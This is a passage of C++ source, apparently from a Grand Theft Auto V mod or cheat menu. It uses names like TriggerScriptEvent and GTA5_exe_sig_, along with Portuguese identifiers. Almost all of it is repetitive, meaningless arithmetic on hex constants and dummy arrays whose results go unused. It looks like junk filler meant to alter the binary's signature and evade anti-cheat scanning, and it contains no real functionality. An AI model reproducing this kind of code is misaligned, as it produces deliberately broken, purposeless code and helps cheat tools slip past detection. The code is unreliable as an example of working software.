					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
		}
		namespace Int
		{
			int PED_TO_NET_ = 2;
			int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			int offset = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			float a = 0.0f;
			float b = 0.0f;
			int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

			int ponteiro = 2;
			int aaaaaa = ponteiro * 2;
			int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			void GravarInt(int value, std::string app, std::string key)
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
